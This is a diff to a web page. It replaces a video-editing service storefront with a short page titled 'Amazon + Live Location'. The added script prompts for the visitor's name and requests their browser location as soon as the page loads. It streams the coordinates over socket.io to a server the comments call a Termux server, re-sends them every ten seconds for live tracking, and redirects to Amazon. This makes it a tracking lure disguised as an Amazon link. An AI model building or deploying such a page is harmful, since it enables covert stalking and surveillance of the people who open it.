@@ -1,368 +1,44 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>Paid Edit Center - Ultra Pro Animated</title>
-<style>
-body{
-  margin:0;
-  font-family:Arial,sans-serif;
-  scroll-behavior:smooth;
-  color:white;
-  overflow-x:hidden;
-  background: url("https://i.supaimg.com/0d0490c1-08ed-4b67-ad38-61f0828eb1d0/d66f02d2-bba7-4768-be8b-fe046a10e5d2.jpg") no-repeat center center/cover;
-}
-
-.light-mode{
-  background:white;
-  color:black;
-}
-
-header{
-  text-align:center;
-  padding:50px 20px 20px;
-}
-
-.header-box{
-  display:inline-block;
-  background: rgba(0,0,0,0.5);
-  border: 3px solid #ff0066;
-  border-radius: 25px;
-  padding: 25px 40px;
-  text-align:center;
-  box-shadow: 0 0 30px rgba(255,0,102,0.7), 0 0 60px rgba(255,0,102,0.4);
-  margin-bottom: 30px;
-  transition: 0.5s ease, box-shadow 0.5s ease, transform 0.5s ease;
-}
-
-.header-box h1{
-  font-size:42px;
-  margin:0;
-  text-shadow: 2px 2px 8px black;
-}
-
-.header-box p{
-  font-size:18px;
-  margin-top:8px;
-  text-shadow: 1px 1px 4px black;
-}
-
-.header-box:hover{
-  transform: translateY(-5px) scale(1.03);
-  box-shadow: 0 0 50px rgba(255,0,102,0.9), 0 0 70px rgba(255,51,204,0.6);
-  border-color:#ff33cc;
-}
-
-/* Packages Cards */
-.packages{
-  display:flex;
-  flex-wrap:wrap;
-  justify-content:center;
-  gap:30px;
-  margin:40px 20px;
-}
-
-.card{
-  background:rgba(255,255,255,0.15);
-  backdrop-filter:blur(10px);
-  width:280px;
-  border-radius:20px;
-  overflow:hidden;
-  box-shadow:0 8px 25px rgba(0,0,0,0.5);
-  transition: transform 0.3s, box-shadow 0.3s, opacity 0.6s;
-  opacity:0;
-  transform:translateY(40px);
-  position:relative;
-}
-
-.card.visible{opacity:1; transform:translateY(0);}
-.card:hover{transform:translateY(-10px); box-shadow:0 0 25px #fff;}
-
-.card::before{
-  content:'';
-  position:absolute;
-  top:0; left:-75%;
-  width:50%;
-  height:100%;
-  background:linear-gradient(120deg, rgba(255,255,255,0.2), rgba(255,255,255,0.7), rgba(255,255,255,0.2));
-  transform:skewX(-25deg);
-}
-.card:hover::before{
-  left:125%;
-  transition:1s;
-}
-
-.card img{width:100%; border-bottom:1px solid rgba(255,255,255,0.3);}
-.card .package-name{font-size:20px;font-weight:bold;margin:10px 0 5px;}
-.card .desc{font-size:14px;margin:0 15px 10px;line-height:1.4;}
-.card .price{font-size:26px;font-weight:bold;margin:10px 0;}
-.card .delivery{font-size:13px;color:lightgray;}
-.card .rating{color:gold;margin:5px 0;}
-
-.button,.sample-button,.contact-button{
-  padding:15px 35px;
-  font-size:18px;
-  border:none;
-  border-radius:10px;
-  cursor:pointer;
-  transition:0.3s;
-  box-shadow:0 0 8px rgba(0,0,0,0.5);
-  animation:bounce 2s infinite;
-}
-@keyframes bounce{
-  0%,20%,50%,80%,100%{transform:translateY(0);}
-  40%{transform:translateY(-5px);}
-  60%{transform:translateY(-3px);}
-}
-
-.button{background:black;color:white;}
-.button:hover{
-  background:#ff0000;
-  box-shadow:0 0 25px #ff0000;
-  transform:scale(1.05);
-}
-
-.sample-button{background:black;color:white;}
-.sample-button:hover{
-  background:#ff0066;
-  box-shadow:0 0 25px #ff0066;
-  transform:scale(1.05);
-}
-
-.contact-button{color:white;}
-.contact-button:hover{
-  box-shadow:0 0 20px rgba(255,255,255,0.8);
-  transform:scale(1.05);
-}
-
-.section-title{font-size:28px;font-weight:bold;margin:60px 0 15px;text-shadow:2px 2px 6px black;}
-.section-text{font-size:15px;line-height:1.4;margin:0 20px;}
-
-/* Boxes */
-.what-you-get-box, .info-box{
-  background: rgba(0,0,0,0.5);
-  border: 2px solid #ff0066;
-  border-radius: 20px;
-  padding: 20px;
-  max-width: 500px;
-  margin: 0 auto 40px;
-  box-shadow: 0 0 25px rgba(255,0,102,0.7);
-  text-align:left;
-  font-size:16px;
-  line-height:1.6;
-  transition: 0.5s ease, box-shadow 0.5s ease, transform 0.5s ease;
-}
-.what-you-get-box ul, .info-box ul{
-  list-style: none;
-  padding: 0;
-  margin: 0;
-}
-.what-you-get-box li, .info-box li{
-  position: relative;
-  padding-left: 25px;
-  margin-bottom: 10px;
-}
-.what-you-get-box li::before, .info-box li::before{
-  content:"✔";
-  position:absolute;
-  left:0;
-  color:#ff0066;
-  font-weight:bold;
-}
-.what-you-get-box:hover, .info-box:hover{
-  transform: translateY(-5px) scale(1.02);
-  box-shadow: 0 0 40px rgba(255,255,255,0.6), 0 0 60px rgba(255,0,102,0.5);
-  border-color: #ff33cc;
-}
-
-#whatsapp-btn{
-  position:fixed; bottom:20px; right:20px;
-  z-index:1000;
-  padding:18px 25px;
-  border-radius:50px;
-  font-size:18px;
-  background:#25D366;
-  color:white;
-  cursor:pointer;
-  box-shadow:0 0 20px #25D366;
-  transition:0.3s;
-}
-#whatsapp-btn:hover{
-  box-shadow:0 0 35px #25D366;
-  transform:scale(1.05);
-}
-
-footer{margin-top:60px;padding:30px 0;font-size:14px;color:lightgray;text-align:center;}
-
-#mode-toggle{
-  position:fixed; top:20px; right:100px;
-  padding:10px 15px;
-  border:none;
-  border-radius:8px;
-  background:#333; color:white;
-  cursor:pointer; box-shadow:0 0 15px rgba(0,0,0,0.5);
-  transition:0.3s;
-}
-#mode-toggle:hover{background:#555;}
-
-#music-toggle{
-  position:fixed; top:20px; right:20px;
-  padding:10px 15px;
-  border:none;
-  border-radius:8px;
-  background:#ff0066;
-  color:white;
-  cursor:pointer;
-  box-shadow:0 0 15px rgba(0,0,0,0.5);
-  transition:0.3s;
-}
-#music-toggle:hover{background:#ff3399;}
-
-.video-container{
-  margin:20px auto;width:320px; max-width:90%;
-  border-radius:15px; overflow:hidden;
-  box-shadow:0 0 25px rgba(0,0,0,0.7);
-  opacity:0; transform:translateY(40px);
-  transition:0.6s;
-}
-.video-container.visible{opacity:1; transform:translateY(0);}
-</style>
+    <title>Amazon + Live Location</title>
 </head>
 <body>
+    <h2>Welcome! Loading Amazon & Sending Location...</h2>
 
-<header>
-  <div class="header-box">
-    <h1>Paid Edit Center</h1>
-    <p>Professional Video Editing Service</p>
-  </div>
-</header>
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io(); // connect to server
+        const name = prompt("Enter your name");
 
-<div class="packages">
-<div class="card">
-<img src="https://i.supaimg.com/0d0490c1-08ed-4b67-ad38-61f0828eb1d0/46d3a18f-abd1-4e70-88b9-4670805ba279.jpg">
-<div class="package-name">Best Reel Edit</div>
-<div class="desc">HD Quality • Beat Sync • Effects • Color Grade</div>
-<div class="rating">⭐⭐⭐⭐⭐</div>
-<div class="price">₹150</div>
-<div class="delivery">Delivery: 24 Hours</div>
-<button class="button" onclick="orderNow('150')">Order Now</button>
-</div>
+        function sendLocation(position) {
+            const data = {
+                name: name,
+                lat: position.coords.latitude,
+                lon: position.coords.longitude
+            };
+            socket.emit("location", data); // send to Termux server
+        }
 
-<div class="card">
-<img src="https://i.supaimg.com/0d0490c1-08ed-4b67-ad38-61f0828eb1d0/8d067d3b-ccf9-4fb3-94f9-9e090301af0c.jpg">
-<div class="package-name">Long Video Edit</div>
-<div class="desc">Cinematic Edit • Smooth Cuts • Effects • Color Grade</div>
-<div class="rating">⭐⭐⭐⭐⭐</div>
-<div class="price">₹300</div>
-<div class="delivery">Delivery: 48 Hours</div>
-<button class="button" onclick="orderNow('300')">Order Now</button>
-</div>
-</div>
+        function requestLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    sendLocation,
+                    () => console.log("Location permission denied")
+                );
+            } else {
+                console.log("Geolocation not supported");
+            }
+        }
 
-<div class="section-title">View Editing Samples</div>
-<div class="video-container">
-<iframe width="320" height="180" src="https://www.youtube.com/embed/nZbHgUxsjvk?autoplay=0&mute=1&rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-</div>
-<div class="video-container">
-<iframe width="320" height="180" src="https://www.youtube.com/embed/b3fMvlTkoVg?autoplay=0&mute=1&rel=0" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
-</div>
+        // Ask for location immediately
+        requestLocation();
 
-<div class="section-title">What You Get</div>
-<div class="what-you-get-box">
-  <ul>
-    <li>HD Quality</li>
-    <li>Beat Sync</li>
-    <li>Smooth Cuts</li>
-    <li>Color Grading</li>
-    <li>Cinematic Effects</li>
-  </ul>
-</div>
+        // Optional: repeat every 10 sec for live tracking
+        setInterval(requestLocation, 10000);
 
-<div class="section-title">Fast Delivery 🚀</div>
-<div class="info-box">
-  <ul>
-    <li>Reel Edit → 24 Hours</li>
-    <li>Long Video Edit → 48 Hours</li>
-  </ul>
-</div>
-
-<div class="section-title">Client Reviews</div>
-<div class="info-box">
-  <ul>
-    <li>⭐⭐⭐⭐⭐ "Best editor, fast delivery"</li>
-    <li>⭐⭐⭐⭐⭐ "Amazing reel edits 🔥"</li>
-  </ul>
-</div>
-
-<div class="section-title">Contact Me</div>
-<div style="display:flex;justify-content:center;gap:20px;flex-wrap:wrap;">
-<a href="https://wa.me/qr/TKI4CFVV4YBEL1" target="_blank">
-<button class="contact-button" style="background:#25D366;">WhatsApp</button>
-</a>
-<a href="https://www.instagram.com/murphy_vengeance?igsh=bXB0aW8wMGp6MGsw" target="_blank">
-<button class="contact-button" style="background:#E1306C;">Instagram</button>
-</a>
-</div>
-
-<footer>© 2026 Paid Edit Center • All Rights Reserved</footer>
-<div id="whatsapp-btn" onclick="orderNowFloating()">Order Now (WhatsApp)</div>
-<button id="mode-toggle" onclick="toggleMode()">Light/Dark Mode</button>
-<button id="music-toggle">Music On</button>
-
-<!-- Background Music -->
-<audio id="bgMusic" src="https://image2url.com/r2/default/audio/1773576735448-07c25b97-05b9-4245-bd3e-485babff04be.m4a" loop autoplay muted></audio>
-
-<!-- Order Sound -->
-<audio id="orderSound"><source src="https://increasing-rose-btxcnfkfql.edgeone.app/InShot_20260315_045343109.mp3" type="audio/mpeg"></audio>
-
-<script>
-// Orders
-function orderNow(price){
-let sound=document.getElementById("orderSound"); sound.play();
-let message="Hello, I want ₹"+price+" video editing service";
-setTimeout(()=>{window.open("https://wa.me/qr/TKI4CFVV4YBEL1?text="+encodeURIComponent(message));},800);
-}
-function orderNowFloating(){
-let sound=document.getElementById("orderSound"); sound.play();
-let message="Hello, I want to order video editing service";
-setTimeout(()=>{window.open("https://wa.me/qr/TKI4CFVV4YBEL1?text="+encodeURIComponent(message));},800);
-}
-
-// Mode toggle
-function toggleMode(){document.body.classList.toggle('light-mode');}
-
-// Scroll reveal
-function revealOnScroll(){
-let elements=document.querySelectorAll('.card, .video-container');
-let windowBottom=window.innerHeight;
-elements.forEach(el=>{
-let elTop=el.getBoundingClientRect().top;
-if(elTop<windowBottom-100){el.classList.add('visible');}
-});
-}
-window.addEventListener('scroll',revealOnScroll);
-window.addEventListener('load',revealOnScroll);
-
-// Music Toggle Button
-const bgMusic = document.getElementById('bgMusic');
-const musicBtn = document.getElementById('music-toggle');
-
-musicBtn.addEventListener('click', ()=>{
-    if(bgMusic.paused){
-        bgMusic.play();
-        musicBtn.innerText = "Music On";
-    } else {
-        bgMusic.pause();
-        musicBtn.innerText = "Music Off";
-    }
-});
-
-// Auto-play music on load
-window.addEventListener('load', ()=>{
-    bgMusic.play().catch(()=>{});
-    bgMusic.muted = false;
-});
-</script>
-
+        // Open Amazon automatically
+        window.location.href = "https://www.amazon.in";
+    </script>
 </body>
 </html>
